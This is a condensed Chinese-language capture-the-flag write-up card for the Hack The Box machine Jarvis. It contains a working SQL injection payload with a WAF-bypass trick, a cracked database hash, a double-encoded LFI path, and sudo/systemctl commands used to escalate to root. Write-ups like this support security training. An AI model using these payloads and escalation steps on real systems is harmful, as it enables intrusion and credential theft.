---
title: "[HTB] Jarvis Writeup"
category: web
tags: ["Hack The Box - Jarvis", "web", "ironwaf_bypass", "room_sql_injection", "order_by_column_count", "mysql_user_hash_dump"]
signals: ["Hack The Box - Jarvis 2018", "ironwaf_bypass", "room_sql_injection", "order_by_column_count", "mysql_user_hash_dump", "hashcat_john_imissyou", "lfi_php_filter", "sudo_pepper_simpler_py", "ping_injection_systemctl", "sqli", "HTB", "Jarvis", "supersecurehotel", "SQL"]
difficulty: medium
source: "https://www.ctfiot.com/89735.html"
tools: ["PHP", "Python", "hashcat"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# [HTB] Jarvis Writeup

> 赛事：Hack The Box - Jarvis 2018 | 方向：web | 难度：medium | 工具：PHP、Python、hashcat

## 一句话总结

HTB Jarvis: supersecurehotel 房型 SQL 注入 IronWAF bypass + mysql.user 哈希 hashcat 爆 + phpmyadmin 写 shell + LFI 双编码绕 check + sudo -u pepper simpler.py 反弹 root。

## 攻击链

1. supersecurehotel.htb /room.php?cod= 空格/**/绕 IronWAF 2.0.3 → order by 7 = 7 列 → union select 1,2,(subquery),4,5,6,7 注入 → mysql.user 提 DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0 → hashcat imissyou → phpmyadmin 写 PHP shell → /index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_xxx LFI (双编码 253f 绕 check) → www-data → sudo -l pepper:ALL /var/www/Admin-Utilities/simpler.py → echo + systemctl link / enable --now 反弹 root

## 关键 payload

```
GET /room.php?cod=-1/**/union/**/select/**/1,2,({0}),4,5,6,7%23'' / mysql.user DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0:imissyou / target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_xxx / TF=$(mktemp).service; systemctl link/enable --now
```

## 经验教训

IronWAF 2.0.3 用 /**/ 绕空格检测；LFI 路径中 %253f (双 URL 编码) 绕 check 内 file_exists();sudo -l NOPASSWD:simpler.py 用 $() 绕 & ` | ; - 字符黑名单是经典 sudo 提权。

## 标签

ironwaf_bypass、room_sql_injection、order_by_column_count、mysql_user_hash_dump、hashcat_john_imissyou、lfi_php_filter、sudo_pepper_simpler_py、ping_injection_systemctl、lfi_253f_double_encoding、sqli_mysql

## 参考来源

- https://www.ctfiot.com/89735.html
- 原文件：[HTB]_Jarvis_Writeup.full.md
